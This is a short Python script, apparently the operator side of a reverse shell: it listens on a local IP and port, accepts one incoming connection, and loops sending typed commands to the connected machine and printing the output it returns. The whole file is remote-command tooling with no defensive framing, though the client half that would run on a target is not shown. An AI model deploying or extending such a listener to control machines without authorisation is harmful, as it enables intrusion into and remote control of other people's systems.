import socket
import sys

server_ip = "192.168.0.105"
server_port = 12345

s = socket.socket()
s.bind((server_ip,server_port))
s.listen(1)
print("{} on Port {} is listening...".format(server_ip,server_port))
client_socket, client_address = s.accept()
print("{} is connected...".format(client_address[0]))
print("Shell>>> ", end="")
#message = client_socket.recv(4096)
#print(message.decode())
#cwd = client_socket.recv(4096)
#print("Current Directory is {}".format(cwd.decode()))
while True:
    command = input()
    if command == "exit":
        client_socket.close()
        s.close()
        sys.exit()
    if len(command) > 0:
        client_socket.send(command.encode())
        data = client_socket.recv(8192)
        print(data.decode("utf-8"), end="")
